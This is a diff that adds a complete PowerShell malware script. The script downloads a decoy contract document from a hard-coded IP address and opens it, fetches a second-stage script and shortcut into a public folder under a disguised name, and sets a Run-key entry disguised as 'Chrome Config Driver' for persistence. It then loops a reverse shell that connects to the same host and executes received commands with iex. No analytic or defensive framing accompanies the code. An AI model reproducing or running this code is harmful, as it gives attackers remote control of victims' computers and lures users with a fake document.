@@ -1,0 +1,39 @@
+$client = new-object System.Net.WebClient;$client.DownloadFile("http://194.15.112.220:8011/dogovor-podryad-stroy.txt", "$env:temp\dogovor-podryad-stroy.txt"); Start-Process "$env:temp\dogovor-podryad-stroy.txt";
+$client = new-object System.Net.WebClient;$client.DownloadFile("http://194.15.112.220:8011/2.ps1", "C:\users\Public\Music\notepad.ps1"); 
+$client = new-object System.Net.WebClient;$client.DownloadFile("http://194.15.112.220:8011/notepad.lnk", "C:\users\Public\Music\notepad.lnk");
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /V "Chrome Config Driver" /t REG_SZ /F /D "C:\users\Public\Music\notepad.lnk";
+while($true){
+	$job=start-job -scriptblock {
+		try{
+			$socket = new-object System.Net.Sockets.TcpClient("194.15.112.220", 41971);
+			if($socket -eq $null){throw}
+			$stream = $socket.GetStream();
+			$writer = new-object System.IO.StreamWriter($stream);
+			$buffer = new-object System.Byte[] 1024;
+			$encoding = new-object System.Text.UTF8Encoding;
+			cd ~
+			do{
+				$writer.Write("> ");
+				$writer.Flush() ;
+				$read = $null;
+				while($stream.DataAvailable -or ($read = $stream.Read($buffer, 0, 1024)) -eq $null){}
+				$out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
+				$out_split = $out -split " ";
+				if(!$out.equals("exit") -and !$out.equals("r")){
+					try{
+						$res = iex $out -ErrorAction Stop
+						$writer.Write($res -join "`r`n")
+					} catch {$writer.Write("error")}
+					$writer.Write("`r`n")
+				}
+			} While (!$out.equals("exit"))
+			$writer.close()
+			$socket.close()
+			throw
+		}catch {
+			sleep -Seconds 10
+		}
+	}
+	$job | wait-job -timeout 300
+	$job | stop-job
+}   
